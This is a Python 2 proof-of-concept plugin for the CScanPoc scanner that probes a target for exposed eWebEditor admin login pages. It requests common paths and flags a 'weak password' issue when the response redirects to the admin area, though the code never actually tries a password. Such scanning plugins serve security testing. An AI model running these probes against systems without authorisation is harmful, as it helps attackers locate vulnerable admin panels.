# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'eWebEditor_0000' # 平台漏洞编号
    name = 'eWebEditor 弱密码' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.MISCONFIGURATION # 漏洞类型
    disclosure_date = '2013-04-23'  # 漏洞公布时间
    desc = '''
        ewebeditor默认情况下， 可用弱口令登录，从而导致攻击者可据此信息进行后续攻击。
    ''' # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-62352' # 
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'eWebEditor'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'd0b3d20e-8217-4314-a720-452b32f66116' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            paths = ["/admin_login.asp","/admin/ewebeditor/admin_login.asp", "/edit/admin_login.asp", "/ewebeditor/admin_login.asp", "/admin/login.php"] 
            for path in paths:
                vul_url = arg + path
                res = requests.get(vul_url)
                if "admin_default.asp" in res.url and "href='admin_login.asp'" in res.content and "eWebEditor" in res.content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()